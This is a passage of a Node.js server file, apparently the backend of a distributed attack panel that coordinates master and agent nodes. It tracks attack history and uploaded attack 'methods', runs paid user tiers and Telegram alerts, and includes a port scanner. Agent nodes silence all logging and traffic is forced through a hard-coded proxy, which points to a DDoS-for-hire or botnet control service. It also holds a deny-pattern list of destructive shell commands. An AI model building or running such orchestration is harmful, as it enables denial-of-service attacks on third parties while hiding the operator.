/* =============================================================================
 * 1) ENV & CORE IMPORTS
 * ========================================================================== */

require('dotenv').config();

// Matikan pengaruh environment proxy agar default selalu no-proxy
for (const k of [
  'HTTP_PROXY', 'http_proxy',
  'HTTPS_PROXY', 'https_proxy',
  'ALL_PROXY', 'all_proxy',
  'NO_PROXY', 'no_proxy'
]) {
  if (process.env[k]) delete process.env[k];
}

const os = require('os');
const fs = require('fs');
const path = require('path');
const http = require('http');
const https = require('https');
const crypto = require('crypto');
const net = require('net');
const dns = require('dns').promises;
const { execSync, spawn } = require('child_process');
const { Readable } = require('stream');

/* =============================================================================
 * 2) NPM MODULES & THIRD-PARTY
 * ========================================================================== */

const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const whois = require('whois-json');
const bcrypt = require('bcrypt');
const pidusage = require('pidusage');
const xss = require('xss-clean');
const compression = require('compression');
const localtunnel = require('localtunnel');
const cookieParser = require('cookie-parser');
const cookieSignature = require('cookie-signature');
const WebSocket = require('ws');
const pLimit = require('p-limit');
const winston = require('winston');
const rateLimit = require('express-rate-limit');
const { HttpsProxyAgent } = require('https-proxy-agent');

// node-fetch ESM preloaded shim (satu kali import)
const fetchModulePromise = import('node-fetch');

// Fallback AbortController untuk Node < 18 (opsional aman)
if (typeof global.AbortController === 'undefined') {
  try {
    global.AbortController = require('abort-controller');
  } catch {}
}

/* =============================================================================
 * 3) RUNTIME & BASE CONFIG
 * ========================================================================== */

const app = express();
const httpServer = http.createServer(app);
const dataDir = path.join(__dirname, 'data');

const CONFIG_URL =
  process.env.CONFIG_URL || 'https://botapi.ihsan83636.workers.dev';

const port = process.env.PORT || process.env.SERVER_PORT || 2090;
const NODE_TYPE = process.env.NODE_TYPE || 'master'; // 'master' | 'agent'

// Agent node: minimal log
if (NODE_TYPE === 'agent') {
  global.DISABLE_LOG = true;
  console.log = () => {};
  console.info = () => {};
  console.warn = () => {};
  console.error = () => {};
  global.broadcastWS = () => {};
  global.skipAgentMonitor = true;
}

// Flags runtime
let AUTO_DELETE_AGENT = false;
let MASTER_ATTACK_SELF = false;

// Remote config (diisi fetchConfig)
let SUPABASE_URL = '';
let SUPABASE_API_KEY = '';
let MASTER_URL = '';
let TELEGRAM_BOT_TOKEN = '';
let TELEGRAM_CHAT_ID = '';
let apiKey = '';
let AGENT_KEY = '';
let DEFAULT_PHOTO_URL = '';
let COOKIE_SECRET = '';
let PROXY_CHECKER_URL = '';
let supabase = null;

let TELEGRAM_ENABLED = true;

// Cookie hardening
const COOKIE_DOMAIN = process.env.COOKIE_DOMAIN || undefined;
const COOKIE_SAMESITE = process.env.COOKIE_SAMESITE || 'Strict';
const IS_PROD = process.env.NODE_ENV === 'production';

// Path file data
const methodsPath = path.join(dataDir, 'methods.json');
const agentsPath = path.join(dataDir, 'agents.json');
const newsPath = path.join(dataDir, 'news.json');
const historyPath = path.join(dataDir, 'attack_history.json');
const onlineUserPath = path.join(dataDir, 'online_users.json');
const configPath = path.join(dataDir, 'config.json');

// Direktori penting
const uploadDir = path.join(__dirname, 'lib', 'method');
const PLUGINS_DIR = path.join(__dirname, 'plugins');
if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

// File fingerprint agent
const fingerprintFile = path.join(dataDir, 'agent_fingerprint.txt');

// File proxy.txt
const ACTIVE_PROXY_PATH = path.join(__dirname, 'proxy.txt');

// Winston logger
const { createLogger, transports, format } = require('winston');
const { combine, timestamp, printf } = format;

const logger = createLogger({
  level: process.env.LOG_LEVEL || 'info',
  format: combine(
    timestamp(),
    printf(({ timestamp, level, message, ...meta }) => {
      const m = Object.keys(meta).length ? ` ${JSON.stringify(meta)}` : '';
      return `[${timestamp}] [${level.toUpperCase()}] ${message}${m}`;
    })
  ),
  transports: [
    new transports.File({
      filename: path.join(dataDir, 'activity.log'),
      maxsize: 5 * 1024 * 1024,
      maxFiles: 3,
      tailable: true
    })
  ]
});

if (process.env.ENABLE_CONSOLE_LOG === 'true') {
  logger.add(new transports.Console({ level: process.env.LOG_LEVEL || 'info' }));
}

/* =============================================================================
 * 4) PROXY RUNTIME & HTTP LAYER
 * ========================================================================== */

// FLAG PROXY MANUAL
const USE_PROXY = true;
const FORCE_PROXY_ALL = true;
const DEFAULT_PROXY_URL = 'http://161.35.137.111:1043';

function createProxyAgent(proxyUrl) {
  if (!proxyUrl) return null;
  try {
    if (proxyUrl.startsWith('http://') || proxyUrl.startsWith('https://')) {
      return new HttpsProxyAgent(proxyUrl);
    }
    // contoh dukungan socks5:// jika ingin:
    // if (proxyUrl.startsWith('socks')) {
    //   return new SocksProxyAgent(proxyUrl);
    // }
    return new HttpsProxyAgent(proxyUrl); // fallback
  } catch (err) {
    console.error('Failed to create proxy agent:', err.message);
    return null;
  }
}

// Runtime state proxy
let PROXY_RUNTIME = {
  enabled: !!USE_PROXY,
  url: USE_PROXY ? DEFAULT_PROXY_URL : null,
  agent: null,
  lastSwitchedAt: Date.now()
};

const proxyMetrics = {
  totalRequests: 0,
  viaProxyRequests: 0,
  success: 0,
  failed: 0,
  lastError: null,
  lastErrorAt: null,
  avgLatencyMs: 0,
  samples: 0,
  hist: [0, 0, 0, 0, 0, 0, 0]
};
const latencyBuckets = [50, 100, 200, 500, 1000, 2000, Infinity];

// Keep-alive base agents (direct)
const httpAgentKA = new http.Agent({
  keepAlive: true,
  maxSockets: 50,
  maxFreeSockets: 10,
  timeout: 30000,
  keepAliveMsecs: 10000
});
const httpsAgentKA = new https.Agent({
  keepAlive: true,
  maxSockets: 50,
  maxFreeSockets: 10,
  timeout: 30000,
  keepAliveMsecs: 10000
});

// Terapkan config proxy ke runtime & axios
function applyProxyConfig({ enabled, url } = {}) {
  if (typeof enabled === 'boolean') PROXY_RUNTIME.enabled = enabled;

  if (typeof url === 'string') {
    PROXY_RUNTIME.url = url.trim() || null;
  } else if (url === null) {
    PROXY_RUNTIME.url = null;
  }

  PROXY_RUNTIME.agent =
    PROXY_RUNTIME.enabled && PROXY_RUNTIME.url
      ? createProxyAgent(PROXY_RUNTIME.url)
      : null;

  axios.defaults.proxy = false;
  axios.defaults.httpAgent = PROXY_RUNTIME.agent || httpAgentKA;
  axios.defaults.httpsAgent = PROXY_RUNTIME.agent || httpsAgentKA;

  if (global._dynamicFetchProxyAgent) delete global._dynamicFetchProxyAgent;

  PROXY_RUNTIME.lastSwitchedAt = Date.now();
  console.log(
    `[Proxy] Updated config. Enabled=${PROXY_RUNTIME.enabled}, URL=${PROXY_RUNTIME.url}`
  );
}

// Sinkronisasi awal proxy
applyProxyConfig({
  enabled: PROXY_RUNTIME.enabled,
  url: PROXY_RUNTIME.url
});

// Axios defaults & interceptors
axios.defaults.timeout = 18000;
axios.interceptors.response.use(
  (res) => res,
  (err) => Promise.reject(err)
);

// Interceptor metrik
axios.interceptors.request.use((config) => {
  config.metadata = { start: Date.now() };
  proxyMetrics.totalRequests += 1;
  if (PROXY_RUNTIME.enabled) proxyMetrics.viaProxyRequests += 1;
  return config;
});
axios.interceptors.response.use(
  (res) => {
    const start = res.config.metadata?.start || Date.now();
    const dt = Date.now() - start;
    proxyMetrics.samples += 1;
    proxyMetrics.avgLatencyMs = Math.round(
      proxyMetrics.avgLatencyMs * 0.9 + dt * 0.1
    );
    const idx = latencyBuckets.findIndex((b) => dt <= b);
    if (idx >= 0 && proxyMetrics.hist[idx] != null) proxyMetrics.hist[idx] += 1;
    proxyMetrics.success += 1;
    return res;
  },
  (err) => {
    const cfg = err.config || {};
    const start = cfg.metadata?.start || Date.now();
    const dt = Date.now() - start;
    proxyMetrics.samples += 1;
    proxyMetrics.avgLatencyMs = Math.round(
      proxyMetrics.avgLatencyMs * 0.9 + dt * 0.1
    );
    const idx = latencyBuckets.findIndex((b) => dt <= b);
    if (idx >= 0 && proxyMetrics.hist[idx] != null) proxyMetrics.hist[idx] += 1;
    proxyMetrics.failed += 1;
    proxyMetrics.lastError = err.message || String(err);
    proxyMetrics.lastErrorAt = Date.now();
    return Promise.reject(err);
  }
);

// Helper per-request axios (proxy-aware)
function axiosProxyAware(config = {}, { useProxy = null } = {}) {
  const final = { ...config };

  const wantProxy = FORCE_PROXY_ALL
    ? PROXY_RUNTIME.enabled
    : useProxy === null
    ? PROXY_RUNTIME.enabled
    : !!useProxy;

  if (wantProxy && PROXY_RUNTIME.agent) {
    final.httpAgent = PROXY_RUNTIME.agent;
    final.httpsAgent = PROXY_RUNTIME.agent;
    final.proxy = false;
  } else {
    final.httpAgent = httpAgentKA;
    final.httpsAgent = httpsAgentKA;
    final.proxy = false;
  }
  return axios(final);
}

// fetch dynamic ESM + proxy-aware
// default: NO PROXY, hanya pakai proxy bila useProxy === true
const fetch = async (url, options = {}, { useProxy = null } = {}) => {
  const { default: fetchImpl } = await fetchModulePromise;
  const wantProxy = useProxy === true ? true : false;
  const agent = wantProxy ? PROXY_RUNTIME.agent || null : null;
  const opts = agent ? { ...options, agent } : options;
  return fetchImpl(url, opts);
};

// Test proxy sekali di awal (opsional)
;(async () => {
  try {
    const res = await axiosProxyAware(
      { method: 'get', url: 'http://httpbin.org/ip', timeout: 10000 },
      { useProxy: true }
    );
    console.log('[INFO] Proxy test outgoing IP:', res.data);
  } catch (err) {
    console.error('[INFO] Proxy test request failed:', err.message);
  }
})();

/* =============================================================================
 * 5) GLOBAL STATE, CACHE, KONSTANTA LAIN
 * ========================================================================== */

const FILE_CACHE_TTLS = {
  'online_users.json': 5 * 1000,
  'attack_history.json': 5 * 1000,
  'agents.json': 5000
};

let AGENT_LIST = [];
global.LAST_AGENT_STATUS = {};
global.DISABLE_LOG = global.DISABLE_LOG || false;

let localTunnelUrl = null;
let currentTunnel = null;
let LAST_REGISTERED = { name: null, url: null };
let _restartTunnelInProgress = false;

const METHOD_MAX_FILE_KB = Number(process.env.METHOD_MAX_FILE_KB) || 350;
const MAX_FILE_SIZE = METHOD_MAX_FILE_KB * 1024;

// Tambahan konfigurasi efisiensi/stabilitas
const GLOBAL_MAX_CONCURRENT = Number(process.env.GLOBAL_MAX_CONCURRENT || 50);
const MAX_MEMORY_PCT = Number(process.env.MAX_MEMORY_PCT || 90);
const PROCESS_HEARTBEAT_TIMEOUT = Number(
  process.env.PROCESS_HEARTBEAT_TIMEOUT || 10000
);
const PIDUSAGE_INTERVAL_MS = Number(
  process.env.PIDUSAGE_INTERVAL_MS || 2000
);

let lastPidusageAt = 0;
function shouldRunPidusage() {
  const now = Date.now();
  if (now - lastPidusageAt < PIDUSAGE_INTERVAL_MS) return false;
  lastPidusageAt = now;
  return true;
}

const activeProcesses = {};
const agentProcessMap = {};
const stats = {};
const fileCache = new Map();
const fileLocks = new Map();
const processLocks = new Map();
const writeQueueLocks = new Map();
const userCooldownLocks = new Map();
const lastAttackTimestamps = {};
const agentDataLock = { locked: false };

const CACHE_TTL = 2 * 60 * 1000;
const METHOD_CACHE_TTL = 10 * 60 * 1000;
const CONFIG_CACHE_TTL = 10 * 60 * 1000;

let _cachedMethods = null;
let _lastMethodsRead = 0;
let _cachedConfig = null;
let _lastConfigRead = 0;

/* =============================================================================
 * 6) CORE UTILS: LOG, LOCKS, FILE JSON, CONFIG, VALIDASI
 * ========================================================================== */

function logActivity(action, data) {
  if (global.DISABLE_LOG) return;
  logger.info(action, data);
}

async function waitMs(ms) {
  return new Promise((r) => setTimeout(r, ms));
}

async function acquireSpinLock(map, key, base = 5, max = 80) {
  let d = base;
  while (map.get(key)) {
    await waitMs(d);
    d = Math.min(max, d * 2);
  }
  map.set(key, true);
}
function releaseSpinLock(map, key) {
  map.delete(key);
}

async function withFileLock(filepath, fn) {
  await acquireSpinLock(fileLocks, filepath);
  try {
    return await fn();
  } finally {
    releaseSpinLock(fileLocks, filepath);
  }
}

async function debounceWrite(filepath, data, delay = 2000) {
  if (!writeQueueLocks.has(filepath)) {
    writeQueueLocks.set(filepath, {
      timer: null,
      pendingData: null,
      version: 0
    });
  }
  const lock = writeQueueLocks.get(filepath);
  lock.pendingData = data;
  lock.version++;

  if (lock.timer) clearTimeout(lock.timer);

  const currentVersion = lock.version;
  return new Promise((resolve) => {
    lock.timer = setTimeout(async () => {
      if (currentVersion !== lock.version) return resolve(false);
      try {
        await withFileLock(filepath, async () => {
          const serialized = JSON.stringify(lock.pendingData, null, 2);
          const tempPath = `${filepath}.${Date.now()}.tmp`;
          await fs.promises.writeFile(tempPath, serialized, 'utf8');
          try {
            await fs.promises.rename(tempPath, filepath);
          } catch (e) {
            if (e.code === 'EXDEV') {
              await fs.promises.copyFile(tempPath, filepath);
              await fs.promises.unlink(tempPath);
            } else {
              throw e;
            }
          }
          fileCache.delete(filepath);
        });
        resolve(true);
      } catch (e) {
        logActivity('DEBOUNCE_WRITE_ERROR', { filepath, error: e.message });
        resolve(false);
      }
    }, delay);
  });
}

async function flushAllWrites() {
  const start = Date.now();
  while (true) {
    let anyTimer = false;
    for (const lock of writeQueueLocks.values()) {
      if (lock.timer) {
        anyTimer = true;
        break;
      }
    }
    if (!anyTimer) break;
    if (Date.now() - start > 1500) break;
    await waitMs(50);
  }
}

function readFileJsonSafe(filepath, fallback = null) {
  try {
    const now = Date.now();
    const stat = fs.statSync(filepath);
    const cached = fileCache.get(filepath);

    const filename = path.basename(filepath);
    const ttl = FILE_CACHE_TTLS[filename] || CACHE_TTL;

    if (
      cached &&
      cached.mtime === stat.mtimeMs &&
      now - cached.timestamp < ttl
    ) {
      return cached.data;
    }

    const raw = fs.readFileSync(filepath, 'utf8');
    const parsed = JSON.parse(raw);
    fileCache.set(filepath, {
      data: parsed,
      mtime: stat.mtimeMs,
      timestamp: now
    });
    return parsed;
  } catch (e) {
    if (e.code === 'ENOENT') return fallback;
    logActivity('READ_JSON_ERROR', { filepath, error: e.message });
    return fallback;
  }
}

async function writeFileJsonSafe(filepath, data) {
  if (data === undefined || data === null) {
    logActivity('WRITE_JSON_INVALID', { filepath });
    return;
  }
  await withFileLock(filepath, async () => {
    const serialized = JSON.stringify(data, null, 2);
    const tempPath = `${filepath}.${Date.now()}.tmp`;
    await fs.promises.writeFile(tempPath, serialized, 'utf8');
    try {
      await fs.promises.rename(tempPath, filepath);
    } catch (e) {
      if (e.code === 'EXDEV') {
        await fs.promises.copyFile(tempPath, filepath);
        await fs.promises.unlink(tempPath);
      } else {
        throw e;
      }
    }
    fileCache.delete(filepath);
  }).catch((e) => {
    logActivity('WRITE_JSON_ERROR', { filepath, error: e.message });
  });
}

function readConfig() {
  const now = Date.now();
  if (_cachedConfig && now - _lastConfigRead < CONFIG_CACHE_TTL)
    return _cachedConfig;
  _cachedConfig = readFileJsonSafe(configPath, {
    dangerous_keywords: [],
    disabledPlugins: [],
    blacklist_hosts: [],
    blacklist_exact: []
  });
  _lastConfigRead = now;
  return _cachedConfig;
}

function writeConfig(newConfig) {
  if (!newConfig.disabledPlugins) newConfig.disabledPlugins = [];
  return debounceWrite(configPath, newConfig).then(() => {
    _cachedConfig = newConfig;
    _lastConfigRead = Date.now();
  });
}

function generateOrReadFingerprint() {
  try {
    if (fs.existsSync(fingerprintFile)) {
      const content = fs.readFileSync(fingerprintFile, 'utf8').trim();
      if (content.length === 64) return content;
    }
  } catch (e) {
    logActivity('FINGERPRINT_READ_ERROR', { error: e.message });
  }
  const raw = `${os.hostname()}:${os.platform()}:${port}:${Date.now()}:${crypto
    .randomBytes(6)
    .toString('hex')}`;
  const fp = crypto.createHash('sha256').update(raw).digest('hex');
  try {
    fs.writeFileSync(fingerprintFile, fp);
  } catch (e) {
    logActivity('FINGERPRINT_WRITE_ERROR', { error: e.message });
  }
  return fp;
}
const AGENT_FINGERPRINT = generateOrReadFingerprint();

function isValidFileName(name) {
  return (
    /^[a-zA-Z0-9_\-\.]+$/.test(name) &&
    !name.includes('..') &&
    !name.startsWith('.')
  );
}

function getSafeFilePath(baseDir, filename) {
  if (!isValidFileName(filename) || filename.startsWith('.')) {
    throw new Error('Nama file tidak valid');
  }
  const resolved = path.resolve(baseDir, filename);
  if (!resolved.startsWith(path.resolve(baseDir))) {
    throw new Error('Akses file tidak diizinkan');
  }
  return resolved;
}

function isForbiddenShell(command) {
  const forbidden = [
    /\brm\b/i,
    /\breboot\b/i,
    /\bshutdown\b/i,
    /\binit\b/i,
    /\bdd\b/i,
    /\bmkfs\b/i,
    /\bpasswd\b/i
  ];
  return forbidden.some((pattern) => pattern.test(command));
}

function isValidPort(v) {
  const n = Number(v);
  return Number.isInteger(n) && n >= 1 && n <= 65535;
}

function escapeTelegram(text) {
  if (!text) return '';
  return String(text)
    .replace(/```/g, '\\`\\`\\`')
    .replace(/\\/g, '\\\\')
    .replace(/_/g, '\\_')
    .replace(/\*/g, '\\*')
    .replace(/\[/g, '\\[')
    .replace(/\]/g, '\\]')
    .replace(/\(/g, '\\(')
    .replace(/\)/g, '\\)')
    .replace(/~/g, '\\~')
    .replace(/`/g, '\\`')
    .replace(/>/g, '\\>')
    .replace(/#/g, '\\#')
    .replace(/\+/g, '\\+')
    .replace(/-/g, '\\-')
    .replace(/=/g, '\\=/')
    .replace(/\|/g, '\\|')
    .replace(/{/g, '\\{')
    .replace(/}/g, '\\}')
    .replace(/\./g, '\\.')
    .replace(/!/g, '\\!');
}

function isBlacklisted(host) {
  const config = readConfig();
  const blacklist = config.blacklist_hosts || [];
  const blacklistExact = config.blacklist_exact || [];
  if (blacklistExact.includes(host)) return true;
  return blacklist.some((item) => host.includes(item));
}

async function withProcessLock(processId, fn) {
  await acquireSpinLock(processLocks, processId);
  try {
    return await fn();
  } finally {
    releaseSpinLock(processLocks, processId);
  }
}

async function withAgentDataLock(fn) {
  const start = Date.now();
  let waited = 0;
  let d = 5;
  while (agentDataLock.locked) {
    await waitMs(d);
    d = Math.min(80, d * 2);
    waited += d;
    if (waited > 1500) {
      logActivity('AGENT_DATA_LOCK_WAIT_LONG', { waitedMs: waited });
      break;
    }
  }
  agentDataLock.locked = true;
  try {
    return await fn();
  } finally {
    agentDataLock.locked = false;
  }
}

async function withUserCooldownLock(username, fn) {
  await acquireSpinLock(userCooldownLocks, username);
  try {
    return await fn();
  } finally {
    releaseSpinLock(userCooldownLocks, username);
  }
}

async function safeFileOperation(fn) {
  try {
    return await fn();
  } catch (e) {
    if (e.code === 'ENOSPC') {
      logActivity('DISK_FULL', { critical: true });
      await sendTelegramAlert('⚠️ Disk hampir penuh!');
    }
    throw e;
  }
}

function backoff(attempt) {
  return Math.min(16000, 500 * Math.pow(2, attempt));
}

async function withRetry(fn, { retries = 2 } = {}) {
  let lastErr;
  for (let i = 0; i <= retries; i++) {
    try {
      return await fn();
    } catch (e) {
      lastErr = e;
      if (i === retries) break;
      await waitMs(backoff(i));
    }
  }
  throw lastErr;
}

/* =============================================================================
 * 7) PLUGIN SYSTEM
 * ========================================================================== */

const loadedPlugins = {};

function loadPlugins() {
  if (!fs.existsSync(PLUGINS_DIR)) {
    fs.mkdirSync(PLUGINS_DIR, { recursive: true });
    logActivity('PLUGINS_DIR_CREATED', { path: PLUGINS_DIR });
    return;
  }

  const pluginFiles = fs
    .readdirSync(PLUGINS_DIR)
    .filter((f) => f.endsWith('.js') && !f.startsWith('_'));

  const disabledPlugins = readConfig()?.disabledPlugins || [];

  for (const file of pluginFiles) {
    try {
      const pluginName = path.basename(file, '.js');
      if (disabledPlugins.includes(pluginName)) {
        logActivity('PLUGIN_SKIPPED_DISABLED', { plugin: pluginName });
        continue;
      }
      if (loadedPlugins[pluginName]) continue;

      const pluginPath = path.join(PLUGINS_DIR, file);
      logActivity('LOADING_PLUGIN', { file, path: pluginPath });

      delete require.cache[require.resolve(pluginPath)];
      const plugin = require(pluginPath);

      if (typeof plugin.init !== 'function') {
        throw new Error('Plugin harus mengekspor fungsi init()');
      }

      const initResult = plugin.init({
        app,
        supabase,
        axios,
        logger: logActivity,
        config: readConfig(),
        methods: readMethods(),
        agents: AGENT_LIST,
        broadcastWS,
        wss,
        uploadDir,
        dataDir
      });

      if (initResult && typeof initResult.then === 'function') {
        initResult.catch((e) => {
          logActivity('PLUGIN_INIT_ASYNC_ERROR', {
            plugin: file,
            error: e.message,
            stack: e.stack
          });
        });
      }

      loadedPlugins[pluginName] = plugin;
      logActivity('PLUGIN_LOAD_SUCCESS', { plugin: file });
    } catch (e) {
      logActivity('PLUGIN_LOAD_FAILED', {
        plugin: file,
        error: e.message,
        stack: e.stack
      });
    }
  }
}

function updatePluginsWithWSS() {
  for (const pluginName in loadedPlugins) {
    const p = loadedPlugins[pluginName];
    if (p.updateWSS && typeof p.updateWSS === 'function') {
      try {
        p.updateWSS(wss);
      } catch (e) {
        logActivity('PLUGIN_UPDATE_WSS_ERROR', {
          plugin: pluginName,
          error: e.message
        });
      }
    }
  }
}

function reloadAllPlugins() {
  const results = {};
  const disabledPlugins = readConfig()?.disabledPlugins || [];

  for (const pluginName in loadedPlugins) {
    if (loadedPlugins[pluginName].cleanup) {
      try {
        loadedPlugins[pluginName].cleanup();
        results[pluginName] = { cleanup: 'success' };
      } catch (e) {
        results[pluginName] = { cleanup: 'failed', error: e.message };
        logActivity('PLUGIN_CLEANUP_ERROR', {
          plugin: pluginName,
          error: e.message
        });
      }
    }
    delete loadedPlugins[pluginName];
  }

  const pluginFiles = fs
    .readdirSync(PLUGINS_DIR)
    .filter((f) => f.endsWith('.js') && !f.startsWith('_'));

  for (const file of pluginFiles) {
    const pluginPath = path.join(PLUGINS_DIR, file);
    delete require.cache[require.resolve(pluginPath)];
  }

  loadPlugins();
  updatePluginsWithWSS();
  return results;
}

function unloadPlugin(pluginName) {
  if (loadedPlugins[pluginName]) {
    if (typeof loadedPlugins[pluginName].cleanup === 'function') {
      try {
        loadedPlugins[pluginName].cleanup();
      } catch {}
    }
    delete require.cache[require.resolve(path.join(PLUGINS_DIR, `${pluginName}.js`))];
    delete loadedPlugins[pluginName];
    return true;
  }
  return false;
}

function reloadPlugin(pluginName) {
  try {
    if (!pluginName) return false;
    const pluginPath = path.join(PLUGINS_DIR, `${pluginName}.js`);
    delete require.cache[require.resolve(pluginPath)];

    if (loadedPlugins[pluginName]?.cleanup) {
      try {
        loadedPlugins[pluginName].cleanup();
      } catch (e) {
        logActivity('PLUGIN_CLEANUP_ERROR', {
          plugin: pluginName,
          error: e.message
        });
      }
    }

    const plugin = require(pluginPath);
    if (typeof plugin.init !== 'function') {
      logActivity('PLUGIN_INIT_MISSING', { plugin: pluginName });
      return false;
    }

    const result = plugin.init({
      app,
      supabase,
      axios,
      logger: logActivity,
      config: readConfig(),
      methods: readMethods(),
      agents: AGENT_LIST,
      broadcastWS,
      wss,
      uploadDir,
      dataDir
    });

    if (result?.then) {
      result.catch((e) => {
        logActivity('PLUGIN_INIT_ASYNC_ERROR', {
          plugin: pluginName,
          error: e.message
        });
      });
    }

    loadedPlugins[pluginName] = plugin;
    logActivity('PLUGIN_RELOADED', { plugin: pluginName });
    return true;
  } catch (e) {
    logActivity('PLUGIN_RELOAD_ERROR', {
      plugin: pluginName,
      error: e.message
    });
    return false;
  }
}

/* =============================================================================
 * 8) AGENT MONITOR & ATTACK MONITOR
 * ========================================================================== */

const agentStatusCache = {};
const agentErrorTracker = {};

function hasChanged(agentId, newData) {
  const old = agentStatusCache[agentId];
  const json = JSON.stringify(newData);
  if (old === json) return false;
  agentStatusCache[agentId] = json;
  return true;
}

const CB_COOLDOWN = 60_000;
function shouldSkipAgent(agentId) {
  const fail = agentErrorTracker[agentId];
  if (!fail) return false;
  if (fail.count >= 3) {
    const dt = Date.now() - fail.lastFail;
    if (dt < CB_COOLDOWN) return true;
    agentErrorTracker[agentId] = { count: 0, lastFail: 0 };
    return false;
  }
  return false;
}

async function queryAgentStatus(agent, retries = 3, delay = 1000) {
  const agentId = agent.name || agent.url;
  if (shouldSkipAgent(agentId)) return { status: 'skipped', agent };

  try {
    const response = await axiosProxyAware(
      {
        method: 'get',
        url: `${agent.url}/api/attack/stats`,
        params: { key: AGENT_KEY },
        timeout: 15000,
        validateStatus: (s) => s >= 200 && s < 300
      },
      { useProxy: false }
    );
    delete agentErrorTracker[agentId];
    return { status: 'success', agent, data: response.data };
  } catch (e) {
    if (retries > 0) {
      const newDelay = Math.min(delay * 2, 16000);
      logActivity('QUERY_AGENT_RETRY', {
        agentId,
        retriesLeft: retries - 1,
        delay: newDelay,
        error: e.message
      });
      await waitMs(delay);
      return queryAgentStatus(agent, retries - 1, newDelay);
    }
    if (!agentErrorTracker[agentId]) {
      agentErrorTracker[agentId] = { count: 1, lastFail: Date.now() };
    } else {
      agentErrorTracker[agentId].count++;
      agentErrorTracker[agentId].lastFail = Date.now();
    }
    logActivity('QUERY_AGENT_FAILED', { agentId, error: e.message });
    return { status: 'failed', agent, error: e.message };
  }
}

function adaptiveAgentInterval() {
  const count = AGENT_LIST.length;
  if (count < 10) return 5000;
  if (count < 30) return 10000;
  return 15000;
}

function getAgentQueryLimit() {
  const n = AGENT_LIST.length || 1;
  return Math.min(8, Math.max(4, Math.ceil(n / 6)));
}

async function updateAgentStatus() {
  await withAgentDataLock(async () => {
    const agents = AGENT_LIST.filter((a) => a.enabled !== false);
    if (agents.length === 0) return;

    const limit = pLimit(getAgentQueryLimit());
    const results = await Promise.all(
      agents.map((a) => limit(() => queryAgentStatus(a)))
    );

    const updates = [];
    for (const res of results) {
      const agent = res.agent;
      const agentId = agent.name || agent.url;

      if (res.status === 'success') {
        if (
          res.data &&
          typeof res.data === 'object' &&
          Object.keys(res.data).length > 0
        ) {
          LAST_AGENT_STATUS[agentId] = res;
          if (agent.enabled === false) {
            agent.enabled = true;
            logActivity('AGENT_RE_ENABLED', { agent });
            await saveAgentsAndFlush?.();
          }
          if (hasChanged(agentId, res.data)) {
            updates.push({ name: agentId, ...res });
          }
        } else {
          logActivity('AGENT_STATUS_EMPTY_DATA', { agentId, raw: res.data });
        }
      } else if (res.status === 'failed') {
        updates.push({ name: agentId, ...res });
      }
    }
    if (updates.length > 0) enqueueAgentUpdates(updates);
  });
}

function startAgentMonitorLoop() {
  const loop = async () => {
    try {
      loadAgents();
      await updateAgentStatus();
    } catch (e) {
      logActivity('AGENT_MONITOR_LOOP_ERROR', { error: e.message });
    }
    const base = adaptiveAgentInterval();
    setTimeout(loop, base + Math.floor(Math.random() * 1000));
  };
  if (!global.skipAgentMonitor) loop();
}
if (NODE_TYPE === 'master') {
  startAgentMonitorLoop();
  setInterval(() => autoDowngradeExpiredUsers(), 60_000);
  setInterval(() => cleanupOldHistory(7), 60 * 60 * 1000);
}

/* =============================================================================
 * 9) TELEGRAM & NETWORK TOOLS
 * ========================================================================== */

async function sendTelegramPhoto(caption, photoUrl = DEFAULT_PHOTO_URL) {
  if (NODE_TYPE === 'agent') return;
  if (!TELEGRAM_ENABLED) return;
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;

  const apiBase = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

  const safeCaptionRaw = String(caption || '').slice(0, 1800);
  const safeCaption = escapeTelegram(safeCaptionRaw);

  const payload = {
    chat_id: TELEGRAM_CHAT_ID,
    caption: safeCaption,
    parse_mode: 'MarkdownV2'
  };

  const validPhoto =
    typeof photoUrl === 'string' &&
    photoUrl.length > 0 &&
    /^https?:\/\//i.test(photoUrl);

  const maxRetries = 2;
  let lastErr;

  const trySendPhoto = () =>
    axiosProxyAware(
      {
        method: 'post',
        url: `${apiBase}/sendPhoto`,
        data: { ...payload, photo: photoUrl },
        timeout: 12000
      },
      { useProxy: PROXY_RUNTIME.enabled }
    );

  const sendFallbackMessage = async (originalErrorText) => {
    const text = [
      'ℹ️ Notifikasi:',
      safeCaptionRaw,
      '',
      originalErrorText ? `(sendPhoto fallback: ${originalErrorText})` : ''
    ]
      .filter(Boolean)
      .join('\n')
      .slice(0, 3800);

    try {
      await axiosProxyAware(
        {
          method: 'post',
          url: `${apiBase}/sendMessage`,
          data: { chat_id: TELEGRAM_CHAT_ID, text },
          timeout: 12000
        },
        { useProxy: PROXY_RUNTIME.enabled }
      );
    } catch (e) {
      const plain = text.replace(/[*_`[\]()~>#+\-=|{}.!\\]/g, '');
      await axiosProxyAware(
        {
          method: 'post',
          url: `${apiBase}/sendMessage`,
          data: { chat_id: TELEGRAM_CHAT_ID, text: plain },
          timeout: 12000
        },
        { useProxy: PROXY_RUNTIME.enabled }
      );
    }
  };

  if (!validPhoto) {
    await sendFallbackMessage('photo URL invalid/empty');
    return;
  }

  for (let i = 0; i < maxRetries; i++) {
    try {
      await trySendPhoto();
      return;
    } catch (err) {
      lastErr = err;
      const status = err.response?.status;
      const body = err.response?.data;

      logActivity('SEND_TELEGRAM_PHOTO_ERR', {
        status,
        message: err.message,
        body
      });

      if (status === 400) {
        const bodyText =
          typeof body === 'object'
            ? JSON.stringify(body)
            : String(body || '400 Bad Request');
        await sendFallbackMessage(bodyText);
        return;
      }

      await waitMs(1500);
    }
  }

  await sendFallbackMessage(lastErr?.message || 'unknown error');
}

async function scanCommonPorts(
  ip,
  ports = [80, 443, 21, 22, 25, 53, 8080, 8443, 3306]
) {
  const results = [];
  for (const port of ports) {
    // eslint-disable-next-line no-await-in-loop
    const isOpen = await new Promise((resolve) => {
      const socket = new net.Socket();
      socket.setTimeout(1500);
      socket.once('connect', () => {
        socket.destroy();
        resolve(true);
      });
      socket.once('timeout', () => {
        socket.destroy();
        resolve(false);
      });
      socket.once('error', () => resolve(false));
      socket.connect(port, ip);
    });
    if (isOpen) results.push({ port, status: 'open' });
  }
  return results;
}

/* =============================================================================
 * 10) RATE LIMITERS & AUTH MIDDLEWARE
 * ========================================================================== */

// Rate limiters
const limiterLogin = rateLimit({
  windowMs: 5 * 60 * 1000,
